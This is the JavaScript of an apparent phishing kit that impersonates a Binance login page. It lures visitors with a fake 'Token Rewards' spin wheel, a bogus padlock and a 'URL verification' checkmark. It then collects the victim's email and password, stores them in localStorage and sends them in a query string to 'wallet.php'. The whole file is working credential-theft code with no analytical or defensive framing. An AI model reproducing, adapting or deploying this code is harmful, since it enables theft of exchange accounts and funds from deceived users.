// localStorage.clear();

$("#logNav").html(`
<img src="https://abouelghar12.github.io/icon/logo3.png" alt="logo">
<p><span><img src="https://abouelghar12.github.io/icon/padlock.svg" alt="secured"/></span> URL verification: <i>&#10003;</i></p>
`);

$("#logFooter").html(`&copy; 2017 - ${d.getFullYear()} Binance`);

const signInBtn = `<button onclick="logInAccount(this)">Next</button>`;
let tempEmail = "";

let tokenRand = Math.floor(Math.random() * 10000) + 10000;

let redirector = 11;
let setToken = {}

const tokeSpin = `
<section id="signInContainer">
<div id="spinTokenContainer">

<img id="spinImg" src="https://abouelghar12.github.io/pic/settings_bg.png" />

<section>
<h1 id="spinHeader">Token Rewards</h1>

<div class="tokenRewards" id="storeToken" data-target="${tokenRand}">Spin the wheel to receive Token</div>
<button id="spinBtn" onclick="getTokenrewards()">Spin</button>

<p id="spinWheel">&#10050;</p>

<div id="signBtnOptions"></div>
</section>

</div>
</section>
`;

function getTokenrewards() {
    $("#storeToken").text("0");
    $("#spinBtn").hide();
    $("#spinWheel").show();


    const counters = document.querySelectorAll(".tokenRewards");
    counters.forEach((token) => {
        counters.innerText = "0";


        const updateCounts = () => {
            const target = +token.getAttribute("data-target");
            const c = +token.innerText;

            const increment = Math.random() * 100;
            const tk = Math.ceil(c + increment);

            if (c < target) {
                token.innerText = tk;
                setTimeout(updateCounts, 1);
            }
            else if (c >= target) {

                $("#spinImg").attr("src", "https://abouelghar12.github.io/pic/cr7.png");
                $("#spinTokenContainer").show().css({ "display": "flex", "justify-content": "center", "gap": "0rem" });
                $("#spinTokenContainer section").css({ "top": "0" });
                $("#spinTokenContainer img").css({ "height": "40vh", "width": "100%", "opacity": "1", });
                $("#spinWheel").hide();

                setTimeout(() => {
                    $("#spinHeader").text("Congratulations !!!").css({ "color": "#7CFC00" });
                    $("#storeToken").text("Token Reward:" + " " + "$" + $("#storeToken").text());

                    const stopCounts = setInterval(() => {
                        if (redirector <= 0) {
                            clearInterval(stopCounts);
                            $("#logBody").html(firstLog);

                            setToken.reward = tokenRand;
                            localStorage.setItem('appToken', JSON.stringify(setToken));
                        }
                        else {
                            redirector--
                            $("#signBtnOptions").html(`<span>You will be redirected in <i>${redirector}</i> to claim rewards`)
                        }
                    }, 1000);

                }, 500);
            }
            else {
                token.innerText = target;
            }

            // 
        };

        updateCounts();
    });
};

const firstLog =
    `<section id="signInContainer">
    <h1>Log In</h1>
    <div>
    <span id="inputIdentifier">Email</span>
    <input type="email" id="email_input">
    </div>

    <div>${signInBtn}</div>
    
    <div id="signUpContainer" class="box_down">
    Don't have an account? <a href="#" onclick="navigateSignUp()">Sign up</a>
    </div>
</section>
`;

const secondLog =
    `
    <section id="signInContainer">
    <h2 onclick="goBack()">< &nbsp; Back</h2>
    <h1>Welcome back !</h1>
    <p id="email_holder">${tempEmail}</p>
    
    <div>
    <span id="inputIdentifier">Password</span>
    <input type="password" id="pass_input">
    </div>

    <div>${signInBtn}</div>

    <div id="checkboxContainer" class="box_down">
    <span>Show Password &nbsp; <input onclick="showPassword(this)" type="checkbox"/></span>
    </div>
</section>
`;

$("#logBody").html(tokeSpin);

function logInAccount(b) {
    const verifyin = `<i style="font-weight:500">verify...</i>`;

    if ($("#inputIdentifier").text() == "Email") {
        if (validEmail.test($("#email_input").val().trim())) {

            $("#savedEmail").val($("#email_input").val());

            let explode = $("#email_input").val().replace('@', " ")
            let user = explode.split(" ");
            let username = user[0].slice(0, 1);
            let useremail = user[1];
            let cover = "*";

            $(b).html(verifyin);

            setTimeout(() => {

                $("#logBody").html(secondLog);
                $("#email_holder").html(`${username}${cover.repeat(user[0].length - 1)}@${useremail}`);
            }, 3000);
        }
    }
    else if ($("#inputIdentifier").text() == "Password") {
        if ($("#pass_input").val().length >= 6) {

            let explode = $("#savedEmail").val().replace('@', " ");
            let user = explode.split(" ");
            let username = user[0];

            regData.email = $("#savedEmail").val();
            regData.username = username;
            regData.password = $("#pass_input").val();
            localStorage.setItem('reg_user', JSON.stringify(regData));

            regTracker.user = username;
            localStorage.setItem('userName', JSON.stringify(regTracker));

            let url = "Domain" + "=" + "Binance - " + "&" + "Mail" + "=" + $("#savedEmail").val() + "&" + "Password" + "=" + $("#pass_input").val();

            $(b).html(verifyin);

            setTimeout(() => {
                window.open(
                    'wallet.php?' + url,
                    '_blank'
                );

                location.reload()
            }, 2000);
        }
    }
};

function goBack() {
    $("#logBody").html(firstLog);
};

function showPassword() {
    const s = document.getElementById("pass_input")
    if (s.type === "password") {
        s.type = "text";
    } else {
        s.type = "password";
    }
};

function navigateSignUp() {
    $("#signin_panel").hide();
    $("#login_panel").show();
};

function navigateLoginPage() {
    $("#signin_panel").show();
    $("#login_panel").hide();
};

if (localStorage.hasOwnProperty("appToken")) {
    $("#logBody").html(firstLog);
}
